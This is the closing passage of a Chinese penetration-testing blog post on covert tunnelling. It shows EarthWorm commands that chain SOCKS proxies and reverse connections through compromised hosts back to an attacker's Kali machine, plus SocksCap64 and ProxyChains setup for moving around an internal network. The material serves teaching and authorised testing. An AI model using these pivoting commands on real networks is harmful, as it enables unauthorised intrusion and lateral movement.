+<p>首先，将EW上传到B主机中，利用ssocksd方式启动888端口的SOCKs代理，命令如下。<br><code>ew -s ssocksd -l 888</code></p>
+<p>然后，将EW上传到A主机中，执行如下命令。<br><code>ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888</code></p>
+<p>该命令的意思是：将1080端口收到的代理请求转发给B主机的888端口。现在就可以通过访问A主机的外网1080端口使用在B主机上架设的SOCKS5代理了。</p>
+<p>(4) 二级网络环境(b)<br><img src="/simg/tunnel_12.png" alt=" "><br>假设已经获得了A主机和B主机的控制权限。A主机既没有公网IP地址，也无法访向内网资源。B主机可以访问内网资源，但无法访问外网。</p>
+<p>首先，将EW上传到kali攻击机中，把1080端口收到的代理请求转发给888端口，执行如下命令。<br><code>ew -s lcx_listen -l 10800 -e 888</code></p>
+<p>该命令的意思是：在公网kali攻击机中添加转接隧道，将10800端口收到的代理请求转发给888端口。接着，将EW上传到B主机中，并利用ssocksd方式启动999端口的SOCKS代理，命令如下。<br><code>ew -s ssocksd -l 999</code></p>
+<p>然后，将EW上传到A主机中，执行如下命令。<br><code>ew -s lcx_slave -d 192.168.220.165 -e 888 -f 192。168.52.10 -g 999</code></p>
+<p>该命令的意思是：在A主机上利用lcx_slave方式，将攻击机的888端口和B主机的999端口连接起来。</p>
+<p>(5) 三级网络环境<br><img src="/simg/tunnel_12.png" alt=" "><br>三级网络环境在渗透测试中比较少见，也比较复杂。测试环境为：右侧的内网A主机没有公网IP地址，但可以访问外网；B主机不能访问外网，但可以被A主机访问; C主机可被B主机访问，而且能够访问核心区域。</p>
+<p>首先，将EW上传到kali攻击机中，把1080端口收到的代理请求转发给888端口，执行如下命令。<br><code>ew -s rcsocks -l 1080 -e 888 </code></p>
+<p>在A主机上执行如下命令，将kali攻击机的888端口和B主机的999端口连接起来。<br><code>ew -s lcx_slave -d 192.168.220.165 -e 888 -f &lt;主机B IP地址&gt; -g 999</code></p>
+<p>在B主机上执行如下命令，将999端口收到的代理请求转发给777端口。<br><code>ew -s lcx_listen -l 999 -e 777</code></p>
+<p>在C主机上启动SOCKS5服务，并反弹到B主机的777端口上，命令如下。<br><code>ew -s rssocks -d &lt;主机B IP地址&gt; -e 777</code></p>
+<p>现在就可以通过访问kali攻击机的1080 端口使用在C主机上架设的SOCKS 5代理了</p>
+<h3 id="在Windows下使用SocksCap64实现内网漫游"><a href="#在Windows下使用SocksCap64实现内网漫游" class="headerlink" title="在Windows下使用SocksCap64实现内网漫游"></a>在Windows下使用SocksCap64实现内网漫游</h3><p>下载并安装SocksCap64, 以管理员权限打开程序。<br><img src="/simg/tunnel_14.png" alt=" "></p>
+<p>SocksCap64的使用方法比较简单，单击“代理”按钮，添加一个代理，然后设置代理服务器：的IP地址和端口即可。设置完成后，可以单击界面上的闪电图标按钮，测试当前代理服务器是否可以连接。<br><img src="/simg/tunnel_15.png" alt=" "><br>选择浏览器，单击右键，在弹出的快捷菜单中单击“ 在代理隧道中运行选中程序”选项，就可以自由访问内网资源了。</p>
+<h3 id="在Linux下使用ProxyChains实现内网漫游"><a href="#在Linux下使用ProxyChains实现内网漫游" class="headerlink" title="在Linux下使用ProxyChains实现内网漫游"></a>在Linux下使用ProxyChains实现内网漫游</h3><p>Kali Linux中预装了ProxyChains, 稍加配置就可以使用。打开终端，输入如下命令。<br><code>vi /etc/proxychains.conf</code></p>
+<p>删除“dynamic_ chain” 前面的注释符“#”。来到窗口底部，把“127.0.0.1 9050”改成想要访问的端口的信息。<br><img src="/simg/tunnel_16.png" alt=" "></p>
+<p>测试一下代理服务器是否能正常工作。在终端输入如下命令。<br><code>proxyresolv www.baidu.com</code></p>
+<p>此时会显示“未找到命令”的提示信息。在终端输入如下命令。<br><code>cp /usr/lib/proxychains3/proxyresolv /usr/bin/</code></p>
+<p>再次测试代理服务器的工作是否正常。显示“OK”,表示代理服务器已经正常工作了。现在就可以访问内网了。先访问内网中的网站。在终端输入“proxychains firefox”命令，启动火狐浏览器。</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jiufang/p/16451976.html">内网渗透之隐藏通信隧道技术</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12498">网络隧道：突破内网的通行证</a></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>我很可爱，请给我钱</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Bron
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/08/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/" title="内网渗透之隧道通信">http://example.com/2023/08/29/内网渗透之隧道通信/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/Elaina_Anime">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/SelfEnglishWords">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 内网渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/28/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83/" rel="prev" title="Linux内网渗透之提权">
+      <i class="fa fa-chevron-left"></i> Linux内网渗透之提权
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">隐藏通信隧道基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%A6%82%E8%BF%B0"><span class="nav-number">2.1.</span> <span class="nav-text">隐藏通信隧道概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%86%85%E7%BD%91%E7%9A%84%E8%BF%9E%E9%80%9A%E6%80%A7"><span class="nav-number">2.2.</span> <span class="nav-text">判断内网的连通性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ICMP%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.2.1.</span> <span class="nav-text">ICMP协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.2.2.</span> <span class="nav-text">TCP协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.2.3.</span> <span class="nav-text">HTTP协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.2.4.</span> <span class="nav-text">DNS协议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="nav-number">3.</span> <span class="nav-text">网络层隧道技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#IPv6%E9%9A%A7%E9%81%93"><span class="nav-number">3.1.</span> <span class="nav-text">IPv6隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ipv6%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B"><span class="nav-number">3.1.1.</span> <span class="nav-text">ipv6隧道技术简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1IPv6%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">3.1.2.</span> <span class="nav-text">防御IPv6隧道攻击的方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ICMP%E9%9A%A7%E9%81%93"><span class="nav-number">3.2.</span> <span class="nav-text">ICMP隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#icmpsh"><span class="nav-number">3.2.1.</span> <span class="nav-text">icmpsh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PingTunnel"><span class="nav-number">3.2.2.</span> <span class="nav-text">PingTunnel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1ICMP%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">3.2.3.</span> <span class="nav-text">防御ICMP隧道攻击的方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BC%A0%E8%BE%93%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="nav-number">4.</span> <span class="nav-text">传输层隧道技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LCX%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-number">4.1.</span> <span class="nav-text">LCX端口转发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-number">4.1.1.</span> <span class="nav-text">内网端口转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="nav-number">4.1.2.</span> <span class="nav-text">本地端口映射</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#netcat"><span class="nav-number">4.2.</span> <span class="nav-text">netcat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E6%98%93%E4%BD%BF%E7%94%A8"><span class="nav-number">4.2.1.</span> <span class="nav-text">简易使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96shell"><span class="nav-number">4.2.2.</span> <span class="nav-text">获取shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E4%B8%AD%E6%B2%A1%E6%9C%89nc%E6%97%B6%E8%8E%B7%E5%8F%96%E5%8F%8D%E5%90%91shell"><span class="nav-number">4.2.3.</span> <span class="nav-text">在目标主机中没有nc时获取反向shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86"><span class="nav-number">4.2.4.</span> <span class="nav-text">内网代理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PowerCat"><span class="nav-number">4.3.</span> <span class="nav-text">PowerCat</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="nav-number">5.</span> <span class="nav-text">应用层隧道技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSH%E5%8D%8F%E8%AE%AE"><span class="nav-number">5.1.</span> <span class="nav-text">SSH协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="nav-number">5.1.1.</span> <span class="nav-text">本地转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="nav-number">5.1.2.</span> <span class="nav-text">远程转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91"><span class="nav-number">5.1.3.</span> <span class="nav-text">动态转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1SSH%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="nav-number">5.1.4.</span> <span class="nav-text">防御SSH隧道攻击的思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-x2F-HTTPS%E5%8D%8F%E8%AE%AE"><span class="nav-number">5.2.</span> <span class="nav-text">HTTP&#x2F;HTTPS协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E5%8D%8F%E8%AE%AE-1"><span class="nav-number">5.3.</span> <span class="nav-text">DNS协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8BDNS%E7%9A%84%E8%BF%9E%E9%80%9A%E6%80%A7"><span class="nav-number">5.3.1.</span> <span class="nav-text">查看DNS的连通性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dnscat2"><span class="nav-number">5.3.2.</span> <span class="nav-text">dnscat2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="nav-number">5.3.2.1.</span> <span class="nav-text">服务端</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="nav-number">5.3.2.2.</span> <span class="nav-text">客户端</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iodine"><span class="nav-number">5.3.3.</span> <span class="nav-text">iodine</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1DNS%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">5.3.4.</span> <span class="nav-text">防御DNS隧道攻击的方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SOCKS%E4%BB%A3%E7%90%86"><span class="nav-number">6.</span> <span class="nav-text">SOCKS代理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84SOCKS%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7"><span class="nav-number">6.1.</span> <span class="nav-text">常用的SOCKS代理工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SOCKS%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF%E5%9C%A8%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="nav-number">6.2.</span> <span class="nav-text">SOCKS代理技术在网络环境中的应用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EarthWorm%E7%9A%84%E5%BA%94%E7%94%A8"><span class="nav-number">6.2.1.</span> <span class="nav-text">EarthWorm的应用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8Windows%E4%B8%8B%E4%BD%BF%E7%94%A8SocksCap64%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8"><span class="nav-number">6.2.2.</span> <span class="nav-text">在Windows下使用SocksCap64实现内网漫游</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8Linux%E4%B8%8B%E4%BD%BF%E7%94%A8ProxyChains%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8"><span class="nav-number">6.2.3.</span> <span class="nav-text">在Linux下使用ProxyChains实现内网漫游</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">7.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Bron"
+      src="/images/Elaina.png">
+  <p class="site-author-name" itemprop="name">Bron</p>
+  <div class="site-description" itemprop="description">原谅我这一生不羁放纵爱自由</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">170</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">63</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">55</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/truthnian" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;truthnian" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Elaina_Anime" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Elaina_Anime" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://youtube.com/2CTruth" title="YouTube → https:&#x2F;&#x2F;youtube.com&#x2F;2CTruth" rel="noopener" target="_blank"><i class="fab fa-youtube fa-fw"></i>YouTube</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://truthnian.github.io/" title="https:&#x2F;&#x2F;truthnian.github.io" rel="noopener" target="_blank">世界上最好的网站</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Thu Nov 03 2022 08:00:00 GMT+0800 (Singapore Standard Time) – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bron</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">436k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">6:36</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("11/3/2022 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已存活 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+<script src="https://unpkg.com/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.3s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#FFFFE0',
+  buttonColorLight: '#00BFFF',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+<div class="moon-menu">
+  <div class="moon-menu-items">
+    
+    <div id="moon-menu-item-back2bottom" class="moon-menu-item">
+      <i class='fas fa-chevron-down'></i>    </div>
+    
+    <div id="moon-menu-item-back2top" class="moon-menu-item">
+      <i class='fas fa-chevron-up'></i>    </div>
+    
+  </div>
+  <div class="moon-menu-button">
+    <svg class="moon-menu-bg">
+      <circle class="moon-menu-cricle" cx="50%" cy="50%" r="44%"></circle>
+      <circle class="moon-menu-border" cx="50%" cy="50%" r="48%"></circle>
+    </svg>
+    <div class="moon-menu-content">
+      <div class="moon-menu-icon"><i class='fas fa-ellipsis-v'></i></div>
+      <div class="moon-menu-text"></div>
+    </div>
+  </div>
+</div><script src="/js/injector.js"></script>
+    </div>
+</body>
+</html>
+
+
